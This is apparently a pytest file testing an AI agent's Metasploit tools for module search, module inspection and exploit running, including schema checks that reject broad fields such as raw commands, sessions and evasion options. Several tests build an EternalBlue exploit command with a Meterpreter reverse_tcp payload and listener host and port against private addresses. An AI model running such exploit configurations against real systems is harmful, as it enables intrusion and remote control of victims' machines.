"""Integration tests for split Metasploit msfconsole tools."""

from __future__ import annotations

import os
from unittest.mock import MagicMock, patch

import pytest
from pydantic import ValidationError

from agent.tools.exploitation_tools.metasploit import ModuleType
from agent.tools.exploitation_tools.metasploit.msfconsole import (
    MsfInspectModuleArgs,
    MsfInspectModuleTool,
    MsfModuleInspection,
    MsfRunExploitArgs,
    MsfRunExploitTool,
    MsfSearchModulesArgs,
    MsfSearchModulesTool,
)
from agent.tools.tool_registry import available_tools, get_tool_metadata


REJECTED_BROAD_FIELDS = [
    "command",
    "commands",
    "session_id",
    "post_modules",
    "resource_file",
    "workspace",
    "db_init",
    "encoder",
    "evasion_technique",
    "auto_exploit",
]


def _command_string(command: list[str]) -> str:
    return command[command.index("-x") + 1]


class TestMsfSearchModulesTool:
    """Tests for the Metasploit module search tool."""

    @pytest.fixture
    def tool(self) -> MsfSearchModulesTool:
        return MsfSearchModulesTool()

    def test_build_command_search(self, tool: MsfSearchModulesTool) -> None:
        args = MsfSearchModulesArgs(target="192.168.1.1", search_term="ms17_010")
        cmd = tool.build_command(args)

        assert "msfconsole" in cmd
        assert "-q" in cmd
        assert "search ms17_010" in _command_string(cmd)

    def test_build_command_search_uses_module_type_filter(
        self, tool: MsfSearchModulesTool
    ) -> None:
        args = MsfSearchModulesArgs(
            target="192.168.1.1",
            search_term="ms17_010",
            module_type=ModuleType.EXPLOIT,
        )
        cmd = tool.build_command(args)

        assert "search ms17_010 type:exploit" in _command_string(cmd)

    def test_schema_rejects_broad_fields(self) -> None:
        for field in REJECTED_BROAD_FIELDS:
            with pytest.raises(ValidationError):
                MsfSearchModulesArgs(
                    target="192.168.1.1",
                    search_term="smb",
                    **{field: "invalid"},
                )

    @patch("subprocess.run")
    def test_run_script_mode(
        self, mock_run: MagicMock, tool: MsfSearchModulesTool, sample_search_output: str
    ) -> None:
        mock_run.return_value = MagicMock(stdout=sample_search_output, stderr="", returncode=0)

        result = tool.run(MsfSearchModulesArgs(target="192.168.1.1", search_term="smb"))

        assert result.metadata["execution_mode"] == "script"
        assert result.metadata["sessions_created"] == 0
        assert "parsed_output" in result.metadata


class TestMsfInspectModuleTool:
    """Tests for the Metasploit module inspection tool."""

    @pytest.fixture
    def tool(self) -> MsfInspectModuleTool:
        return MsfInspectModuleTool()

    @pytest.mark.parametrize(
        ("inspection", "expected"),
        [
            (MsfModuleInspection.INFO, "info"),
            (MsfModuleInspection.OPTIONS, "show options"),
            (MsfModuleInspection.TARGETS, "show targets"),
            (MsfModuleInspection.PAYLOADS, "show payloads"),
        ],
    )
    def test_build_command_inspection(
        self,
        tool: MsfInspectModuleTool,
        inspection: MsfModuleInspection,
        expected: str,
    ) -> None:
        args = MsfInspectModuleArgs(
            target="192.168.1.50",
            module_path="exploit/windows/smb/ms17_010_eternalblue",
            inspection=inspection,
        )
        cmd = tool.build_command(args)
        command = _command_string(cmd)

        assert "use exploit/windows/smb/ms17_010_eternalblue" in command
        assert expected in command

    def test_schema_rejects_broad_fields(self) -> None:
        for field in REJECTED_BROAD_FIELDS:
            with pytest.raises(ValidationError):
                MsfInspectModuleArgs(
                    target="192.168.1.1",
                    module_path="exploit/windows/smb/ms17_010_eternalblue",
                    **{field: "invalid"},
                )


class TestMsfRunExploitTool:
    """Tests for the Metasploit exploit runner."""

    @pytest.fixture
    def tool(self) -> MsfRunExploitTool:
        return MsfRunExploitTool()

    def test_build_command_exploit(self, tool: MsfRunExploitTool) -> None:
        args = MsfRunExploitArgs(
            target="192.168.1.50",
            module_path="exploit/windows/smb/ms17_010_eternalblue",
            rhosts="192.168.1.50",
            rport=445,
            payload="windows/meterpreter/reverse_tcp",
            lhost="192.168.1.100",
            lport=4444,
            target_index=0,
            custom_options={"TARGETURI": "/", "SSL": "true"},
        )
        cmd = tool.build_command(args)
        command = _command_string(cmd)

        assert "use exploit/windows/smb/ms17_010_eternalblue" in command
        assert "set RHOSTS 192.168.1.50" in command
        assert "set RPORT 445" in command
        assert "set PAYLOAD windows/meterpreter/reverse_tcp" in command
        assert "set LHOST 192.168.1.100" in command
        assert "set LPORT 4444" in command
        assert "set TARGET 0" in command
        assert "set TARGETURI /" in command
        assert "set SSL true" in command
        assert "exploit -z" in command

    def test_timeout_is_execution_only(self, tool: MsfRunExploitTool) -> None:
        args = MsfRunExploitArgs(
            target="192.168.1.50",
            module_path="exploit/windows/smb/ms17_010_eternalblue",
            timeout=120,
        )
        command = _command_string(tool.build_command(args))

        assert "set TIMEOUT" not in command

    def test_schema_rejects_broad_fields(self) -> None:
        for field in REJECTED_BROAD_FIELDS:
            with pytest.raises(ValidationError):
                MsfRunExploitArgs(
                    target="192.168.1.1",
                    module_path="exploit/windows/smb/ms17_010_eternalblue",
                    **{field: "invalid"},
                )

    def test_run_exploit_only_accepts_exploit_modules(self) -> None:
        with pytest.raises(ValidationError):
            MsfRunExploitArgs(
                target="192.168.1.50",
                module_path="auxiliary/scanner/smb/smb_ms17_010",
            )

    def test_reverse_payload_requires_listener_fields(self) -> None:
        with pytest.raises(ValidationError):
            MsfRunExploitArgs(
                target="192.168.1.50",
                module_path="exploit/windows/smb/ms17_010_eternalblue",
                payload="windows/meterpreter/reverse_tcp",
            )

    def test_parse_output_reports_session_backed_success(
        self, tool: MsfRunExploitTool, sample_session_output: str
    ) -> None:
        args = MsfRunExploitArgs(
            target="192.168.1.50",
            module_path="exploit/windows/smb/ms17_010_eternalblue",
        )
        metadata = tool.parse_output(sample_session_output, "", 0, args)

        assert metadata["sessions_created"] >= 1
        assert metadata["exploit_succeeded"] is True

    @patch.dict("os.environ", {"ENABLE_PTY_EXECUTION": "false"})
    def test_interactive_required_does_not_fallback(self, tool: MsfRunExploitTool) -> None:
        args = MsfRunExploitArgs(
            target="192.168.1.50",
            module_path="exploit/windows/smb/ms17_010_eternalblue",
            payload="windows/meterpreter/reverse_tcp",
            lhost="192.168.1.100",
            lport=4444,
        )

        result = tool.run(args)

        assert result.success is False
        assert result.metadata["error"] == "pty_not_available"
        assert result.metadata["execution_mode"] == "interactive"


def test_registered_tools_include_split_ids_and_exclude_old_id() -> None:
    tools = set(available_tools())

    assert "exploitation_tools.metasploit.search_modules" in tools
    assert "exploitation_tools.metasploit.inspect_module" in tools
    assert "exploitation_tools.metasploit.run_exploit" in tools
    assert "exploitation_tools.metasploit.msfconsole" not in tools


def test_registered_schemas_do_not_expose_rejected_fields() -> None:
    for tool_id in [
        "exploitation_tools.metasploit.search_modules",
        "exploitation_tools.metasploit.inspect_module",
        "exploitation_tools.metasploit.run_exploit",
    ]:
        schema = get_tool_metadata(tool_id)["args_schema"]
        properties = set(schema.get("properties", {}))

        assert not properties.intersection(REJECTED_BROAD_FIELDS)
